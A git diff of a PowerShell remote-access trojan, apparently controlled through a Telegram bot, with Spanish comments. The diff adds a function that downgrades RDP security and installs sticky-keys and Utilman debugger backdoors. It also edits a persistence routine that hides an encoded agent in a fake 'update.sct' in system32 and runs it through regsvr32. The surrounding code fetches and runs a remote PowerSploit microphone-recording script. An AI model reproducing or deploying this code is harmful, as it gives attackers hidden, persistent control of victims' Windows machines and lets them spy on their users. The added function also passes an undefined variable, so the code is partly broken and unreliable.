@@ -151,6 +151,19 @@ bot-send -photo $ruta -botkey $botkey -chat_id $chat_id
 
 }
 
+function Add-Registro
+{
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $False)]
+        [String]$code 
+    )
+    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\" -Name SecurityLayer -Value 1
+    New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Value $Payload
+    New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe"
+    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" -Name Debugger -Value $Payload
+}
+
 
 function graba-audio { param ($botkey,$chat_id,$segundos)
 IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1").content #### Grabar Audio
@@ -189,8 +202,8 @@ function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
-$plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\update.sct" ; sleep 2
-$key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
+$plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\update.sct" 
+Add-Registro -code "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" 
 $texto = "Persistencia ejecutada correctamente"} return $texto;break}
 
 
